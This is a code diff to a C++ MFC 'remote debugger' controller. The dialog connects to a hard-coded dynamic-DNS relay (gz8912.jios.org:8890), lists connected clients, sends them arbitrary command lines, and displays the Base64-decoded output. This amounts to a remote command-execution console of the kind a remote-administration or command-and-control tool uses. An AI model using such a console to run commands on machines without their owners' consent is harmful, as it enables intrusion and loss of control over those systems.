@@ -6,9 +6,18 @@
 #include "RemoteDebuggerController.h"
 #include "RemoteDebuggerControllerDlg.h"
 
-#include "..\公共\MemIni.h"
+#include "..\公共\ProtocolHandler.h"
 #include "..\iocp\IOCPExport.h"
 #pragma comment(lib,"IOCP.lib")
+
+#include "..\公共\Base64.h"
+
+#if defined(DEBUG) || defined(_DEBUG)
+#define REMOTE_SERVER_IP "localhost"
+#else
+#define REMOTE_SERVER_IP "gz8912.jios.org"
+#endif
+
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -82,101 +91,70 @@ END_MESSAGE_MAP()
 
 LRESULT CRemoteDebuggerControllerDlg::OnHandleRecvMsg(WPARAM wParam,LPARAM lParam)
 {
-	LPCWSTR pszMsgOut = (LPCWSTR)wParam;
-	if (pszMsgOut)
+	LPCSTR pszMsgText = (LPCSTR)wParam;
+
+	CProtocolHandler ptlHandler;
+	ptlHandler.ParseProtocolString(pszMsgText,strlen(pszMsgText));
+
+	CStringA strCmd;
+	strCmd = ptlHandler.GetParamValueString("cmd","");
+
+	if (strCmd == "getonlineclient")
 	{
-		CString strRecvData;
-		strRecvData = (WCHAR *)pszMsgOut;
-
-		OutputDebugStringW(strRecvData+L"\r\n");
-
-		BOOL bBreak = FALSE;
-
-		while ( FALSE == bBreak )
+		while( m_wndOnLineClient.GetCount() > 0 )
 		{
-			CString strTempRecvData;
-			
-			int nStart = strRecvData.Find(L"[]\r\n");
-			if (nStart >= 0)
-			{
-				int nEnd = strRecvData.Find(L"[]\r\n",nStart+1);
-
-				if ( nEnd < 0 )
-				{
-					bBreak = TRUE;
-					strTempRecvData = strRecvData;
-				}
-				else
-				{
-					strTempRecvData = strRecvData.Mid(nStart,nEnd-nStart);
-					strRecvData.Delete(0,nEnd);
-				}
-			}
-			else
-			{
-				bBreak = TRUE;
-				strTempRecvData = strRecvData;
-			}
-
-			OutputDebugStringW(strTempRecvData);
-			OutputDebugStringW(L"\r\n");
-
-			CMemIniFile Ini;
-			Ini.ParseMemoryDataW((BYTE *)strTempRecvData.GetBuffer(),strTempRecvData.GetLength()*sizeof(WCHAR));
-
-			CString strCmd;
-			strCmd = Ini.GetIniString(L"",L"cmd",L"");
-
-			if (strCmd == "getonlineclient")
-			{
-				while( m_wndOnLineClient.GetCount() > 0 )
-				{
-					m_wndOnLineClient.DeleteString(0);
-				}
-				int nCount = Ini.GetIniUint( L"" , L"clientcount",0 );
-				for ( int i = 0;i<nCount;i++)
-				{
-					CString strTempKeyName;
-					strTempKeyName.Format(L"client%d",i);
-					HANDLE hHandle = (HANDLE)Ini.GetIniUint(L"",strTempKeyName,0);
-
-					CString strListItem;
-					strListItem.Format(L"%d",hHandle);
-					m_wndOnLineClient.AddString( strListItem );
-
-					int a=0;
-				}
-			}
-
-			if ( strCmd == L"runcmd" )
-			{
-				CString strCmdResult;
-				strCmdResult = Ini.GetIniString(L"",L"result",L"");
-				strCmdResult.Replace(L"\\r",L"\r");
-				strCmdResult.Replace(L"\\n",L"\n");
-
-				int nTextLen = m_wndMsgShow.GetWindowTextLengthW();
-				m_wndMsgShow.SetSel(nTextLen,nTextLen);
-				m_wndMsgShow.ReplaceSel(strCmdResult);
-			}
+			m_wndOnLineClient.DeleteString(0);
 		}
+		int nCount = ptlHandler.GetParamValueInt( "clientcount",0 );
+		for ( int i = 0;i<nCount;i++)
+		{
+			CStringA strTempKeyName;
+			strTempKeyName.Format("client%d",i);
+			HANDLE hHandle = (HANDLE)ptlHandler.GetParamValueInt(strTempKeyName,0);
 
+			CString strListItem;
+			strListItem.Format(L"%d",hHandle);
+			m_wndOnLineClient.AddString( strListItem );
 
-		delete pszMsgOut;
-		
+			int a=0;
+		}
 	}
+
+	if ( strCmd == "runcmd" )
+	{
+		CStringA strCmdResult;
+		strCmdResult = ptlHandler.GetParamValueString("result","");
+		
+// #ifdef DEBUG
+// 		OutputDebugStringA("控制端\r\n");
+// 		OutputDebugStringA(strCmdResult);
+// 		OutputDebugStringA("\r\n");
+// #endif
+
+		strCmdResult = EasyBase64Decode(strCmdResult);
+
+// #ifdef DEBUG
+// 		OutputDebugStringA(strCmdResult);
+// 		OutputDebugStringA("\r\n");
+// #endif
+
+		int nTextLen = m_wndMsgShow.GetWindowTextLengthW();
+		m_wndMsgShow.SetSel(nTextLen,nTextLen);
+		m_wndMsgShow.ReplaceSel(CString(strCmdResult));
+	}
+
 	return 0;
 }
 
 CRemoteDebuggerControllerDlg *pThis = NULL;
 VOID WINAPI DataRecvCallback( HANDLE hClient, BYTE *pDataBuffer,DWORD dwDatalen )
 {
-	CString strMsgOut;
-	strMsgOut = (WCHAR *)pDataBuffer;
+	CStringA strMsgOut;
+	strMsgOut.Append((char *)pDataBuffer,dwDatalen);
 
 	int nLen = strMsgOut.GetLength();
-	WCHAR *pszMsgBuf = new WCHAR[nLen+1];
-	wcscpy_s(pszMsgBuf,nLen+1,strMsgOut.GetBuffer());
+	char *pszMsgBuf = new char[nLen+1];
+	strcpy_s(pszMsgBuf,nLen+1,strMsgOut.GetBuffer());
 
 	pThis->PostMessage(WM_USER+2222,(WPARAM)pszMsgBuf,0);
 }
@@ -193,13 +171,15 @@ BOOL CRemoteDebuggerControllerDlg::OnInitDialog()
 	//  执行此操作
 	SetIcon(m_hIcon, TRUE);			// 设置大图标
 	SetIcon(m_hIcon, FALSE);		// 设置小图标
+
+	m_wndMsgShow.SetLimitText(0);
 #ifdef DEBUG
 	Sleep(500);
 #endif
 	
 	pThis = this;
 	m_hClient = CreateClient(DataRecvCallback,ConnectClosed);
-	BOOL bConRes = ClientConnect(m_hClient,"gz8912.jios.org",8890);
+	BOOL bConRes = ClientConnect(m_hClient,REMOTE_SERVER_IP,8890);
 	if (bConRes)
 	{
 		StartRecvData(m_hClient);
@@ -256,19 +236,19 @@ void CRemoteDebuggerControllerDlg::OnBnClickedOk()
 	
 	if (m_hCurClient)
 	{
-		CString strTargetHandle;
-		strTargetHandle.Format(L"%d",m_hCurClient);
+		CStringA strTargetHandle;
+		strTargetHandle.Format("%d",m_hCurClient);
 
 		if (strTargetHandle.GetLength() > 0 )
 		{
-			CMemIniFile Ini;
-			Ini.WriteIniString(L"",L"cmd",L"runcmd");
-			Ini.WriteIniString(L"",L"data",m_strCmdLine);
-			Ini.WriteIniString(L"",L"target",strTargetHandle);
+			CProtocolHandler ptlHandler;
+			ptlHandler.SetParamValueString("cmd","runcmd");
+			ptlHandler.SetParamValueString("data",CStringA(m_strCmdLine));
+			ptlHandler.SetParamValueString("target",strTargetHandle);
 
-			CString strSendData;
-			strSendData = Ini.BuildData();
-			ClientSendData(m_hClient,(BYTE *)strSendData.GetBuffer(),strSendData.GetLength()*sizeof(WCHAR));
+			CStringA strSendData;
+			strSendData = ptlHandler.BuildData();
+			ClientSendData(m_hClient,(BYTE *)strSendData.GetBuffer(),strSendData.GetLength());
 
 			int a=0;
 		}
@@ -288,13 +268,13 @@ void CRemoteDebuggerControllerDlg::OnTimer(UINT_PTR nIDEvent)
 
 VOID CRemoteDebuggerControllerDlg::RefushOnClient(void)
 {
-	CMemIniFile Ini;
-	Ini.WriteIniString(L"",L"cmd",L"getonlineclient");
-	CString strSendData;
-	strSendData = Ini.BuildData();
+	CProtocolHandler ptlHandler;
+	ptlHandler.SetParamValueString("cmd","getonlineclient");
 
-	ClientSendData(m_hClient,(BYTE *)strSendData.GetBuffer(),strSendData.GetLength()*sizeof(WCHAR));
-	
+	CStringA strSendData;
+	strSendData = ptlHandler.BuildData();
+
+	ClientSendData(m_hClient,(BYTE *)strSendData.GetBuffer(),strSendData.GetLength());
 
 	return VOID();
 }
